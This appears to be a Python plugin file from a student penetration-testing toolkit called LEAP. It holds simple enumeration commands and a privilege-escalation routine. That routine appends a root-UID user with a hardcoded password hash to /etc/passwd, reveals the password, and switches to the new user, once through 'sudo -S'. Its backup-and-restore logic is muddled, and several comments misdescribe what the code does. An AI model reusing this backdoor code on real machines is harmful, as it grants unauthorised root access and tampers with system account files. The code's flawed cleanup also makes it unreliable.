""" Plugins for LEAP designed by Owen Ball (A) """

from plugins import PrivEsc, Enumeration, GeneralPrivEsc #imports the relevent classes from 'plugins' to send commands and information too

import os, tempfile, platform, pty #imports needed libaries to perform certian commands for privilage escalation and enumeration

from subprocess import Popen, PIPE

from consolemenu import Screen #allows an input to be made on the screen so that the previos information doesnt dissapear straight away


"""A class that holds all the Enumeration plugins of person A"""


class EnumA():
    def services_A_linux(): #shows the services running on linux distro
        enum_command=Enumeration("Services", "Owen Ball", "Which services are running", "ps aux") #four parts sent to the 'plugin' file that that
# tells the user that this enumeration displays 'services' with a descirption of what services executes and the actual command 'ps aux' put into a
# variable
        print(enum_command.info()) #This then prints out the relevent information in a set format using the 'info' function in the 'plugins'folder
        Screen().input("press any key ") #allows the user to see the information without dissapearing and by 'pressing any key to continue'
        enum_command.execute() #executes the 'enum_command'
        Screen().input("press any key")
    def _test(command):
        enum_command=Enumeration("t", "e", "est", command) #four parts sent to the 'plugin' file that that
# tells the user that this enumeration displays 'services' with a descirption of what services executes and the actual command 'ps aux' put into a
# variable
        commands=enum_command.execute()
        return commands

    def services_A_windows(): #shows the servcies running on window distro
        services= os.popen('wmic process get description, processid').read() #executes the command on windows to see the services running into a
# variable
        print(services)
    def programs_A_linux(): #shows the programs running on linux distro
        enum_command=Enumeration("Programs installed", "Owen Ball", "What programs are installed", "dpkg -l") #four parts sent to the 'plugin'
#tells the user that this enumeration displays 'programs installed' with a descirption of what services executes and the actual command 'dpkg -l' put
# into a variable 
        print(enum_command.info()) #This then prints out the relevent information in a set format using the 'info' function in the 'plugins'folder
        Screen().input("press any key ") #allows the user to see the information without dissapearing and by 'pressing any key to continue'
        enum_command.execute() #executes the 'enum_command'
        Screen().input("press any key")
    def os_A(): #shows what operating system the local mchine is running on via linux and windows
       system=platform.system() #excutes the command to see what operating system the machine is running on in a varaible
       print(f"This system is running on {system}")
       Screen().input("press any key") #allows the user to see the information without dissapearing and by 'pressing any key to continue'
       file_log=open("log","a") #opens/creates a log file that is appendable
       file_log.write(str(system)) #writes to this file the outcome


"""A class that holds all the Privilage Escalation plugins of person A"""


class PrivEscA():
    def copy_passwd_A_linux(): #function that copies the passwd file makes it malcious and replaces to gaina shell
        priv_sec=GeneralPrivEsc("Copy passwd file", "Owen Ball", "Copies passwd file then adds malicous code which gives new user bash access")  #three
# parts sent to the 'plugin' tells the user that this privilage escalation displays 'copy shadow file' with a descirption of what services executes
        print(priv_sec.info()) #This then prints out the relevent information in a set format using the 'info' function in the 'plugins'folder
        Screen().input("press any key start") #allows the user to see the information without dissapearing and by 'pressing any key to continue'
        commands=["rootprivesc:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash","mkdir copied_password_folder","cp /etc/passwd copied_password_folder","echo 'rootprivesc:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash' >> copied_password_folder/passwd", "ln -s /etc destination", "su rootprivesc"]
       
        """This is a lits of commands making it more effient to be run with the first command adding to the passwd file a new user second creating a
        new folder called 'copied_passwd_folder', then a third command copying the original passwd file to the new folder, proceeding to modifying 
        this folder with malcious code, to then copy back the original to finally chnag the destiantion folder to make it excute correctly and run
        the su new created user with the created pasword to execute the shell"""
        backup_commands=["mkdir backup_folder","cp /etc/passwd backup_folder","cp backup_folder/passwd /etc/passwd"] #set of commands to replace the
# infected passwd file with the old one after using the shell
        open_shadow_file=open("/etc/passwd","a") #opens/creates a passwd file with the append option
        """goes through the commands in the correct order"""
        for i in range(2):
            start=PrivEsc((backup_commands[i])) #finds the correct command and uses the correct class to put it i  the correct format
            start.execute() #executes the command using the 'plugin' file
        open_shadow_file.write((commands[0])) #writes te malcious code into the copied passwd file
        for y in range(1,4):
            start=PrivEsc((commands[y]))
            start.execute()
        open_shadow_file.close() #cloes the file to be read
        Screen().input("Press any key to contine      -The password is 'mrcake'-") #displays the password to use as it needs typing in next
        start=PrivEsc((commands[5]))
        start.execute()
        start=PrivEsc((backup_commands[2]))
        start.execute()
    def _test(): #function that copies the passwd file makes it malcious and replaces to gaina shell
        priv_sec=GeneralPrivEsc("Copy passwd file", "Owen Ball", "Copies passwd file then adds malicous code which gives new user bash access")  #three
# parts sent to the 'plugin' tells the user that this privilage escalation displays 'copy shadow file' with a descirption of what services executes
        commands=["rootprivesc:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash","mkdir copied_password_folder","cp /etc/passwd copied_password_folder","echo 'rootprivesc:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash' >> copied_password_folder/passwd", "ln -s /etc destination", "su rootprivesc"]

        """This is a lits of commands making it more effient to be run with the first command adding to the passwd file a new user second creating a
        new folder called 'copied_passwd_folder', then a third command copying the original passwd file to the new folder, proceeding to modifying 
        this folder with malcious code, to then copy back the original to finally chnag the destiantion folder to make it excute correctly and run
        the su new created user with the created pasword to execute the shell"""
        backup_commands=["mkdir backup_folder","cp /etc/passwd backup_folder","cp backup_folder/passwd /etc/passwd"] #set of commands to replace the
# infected passwd file with the old one after using the shell
        open_shadow_file=open("/etc/passwd","a") #opens/creates a passwd file with the append option
        """goes through the commands in the correct order"""
        for i in range(2):
            start=PrivEsc((backup_commands[i])) #finds the correct command and uses the correct class to put it i  the correct format
            start.execute() #executes the command using the 'plugin' file
        open_shadow_file.write((commands[0])) #writes te malcious code into the copied passwd file
        for y in range(1,4):
            start=PrivEsc((commands[y]))
            start.execute()
        open_shadow_file.close() #cloes the file to be read
        start=PrivEsc((commands[5]))
        os.system('echo mrcake | sudo -S su rootprivesc')
        start.execute()
        start=PrivEsc((backup_commands[2]))
        start.execute()

